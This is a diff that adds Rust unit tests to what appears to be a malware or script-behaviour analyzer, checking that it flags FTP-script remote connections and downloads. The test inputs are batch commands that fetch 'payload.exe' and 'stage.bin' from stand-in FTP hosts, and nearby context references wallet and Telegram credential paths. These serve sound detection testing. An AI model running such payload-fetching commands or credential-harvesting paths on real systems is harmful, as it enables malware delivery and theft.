@@ -14394,6 +14394,104 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn ftp_script_file_emits_remote_connect_and_download() {
+        let report = analyze(
+            br#"echo open ftp-drop.example.com>ftp.txt
+echo binary>>ftp.txt
+echo get payload.exe C:\Temp\payload.exe>>ftp.txt
+ftp -n -s:ftp.txt"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::RemoteConnect { cmd, host, port }
+                        if cmd == "ftp -n -s:ftp.txt"
+                            && host == "ftp-drop.example.com"
+                            && *port == 21
+                )
+            }),
+            "ftp script remote host was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, dst }
+                        if cmd == "ftp -n -s:ftp.txt"
+                            && src == "ftp://ftp-drop.example.com/payload.exe"
+                            && dst.as_deref() == Some(r#"C:\Temp\payload.exe"#)
+                )
+            }),
+            "ftp script get command was not surfaced as download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ftp_script_cd_and_default_get_destination_are_resolved() {
+        let report = analyze(
+            br#"echo open ftp-dir.example.net 2121 >f.scr
+echo cd pub/tools>>f.scr
+echo recv stage.bin>>f.scr
+ftp.exe -s:f.scr"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::RemoteConnect { host, port, .. }
+                        if host == "ftp-dir.example.net" && *port == 2121
+                )
+            }),
+            "ftp script host:port was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "ftp://ftp-dir.example.net:2121/pub/tools/stage.bin"
+                            && dst.as_deref() == Some("stage.bin")
+                )
+            }),
+            "ftp script cwd/default destination was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ftp_script_open_without_download_emits_remote_connect() {
+        let report = analyze(
+            br#"echo open ftp-control.example.org>ftp-only.txt
+echo user anonymous pass@example.org>>ftp-only.txt
+echo dir>>ftp-only.txt
+ftp -s:ftp-only.txt"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::RemoteConnect { cmd, host, port }
+                        if cmd == "ftp -s:ftp-only.txt"
+                            && host == "ftp-control.example.org"
+                            && *port == 21
+                )
+            }),
+            "ftp script open without download did not emit RemoteConnect: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn wallet_extension_and_telegram_paths_emit_credential_access_traits() {
         let script = br#"set "walletPaths[Exodus]=AppData\Roaming\Exodus\exodus.wallet"
 set "tdataPath=C:\Users\puncher\AppData\Roaming\Telegram Desktop\tdata"
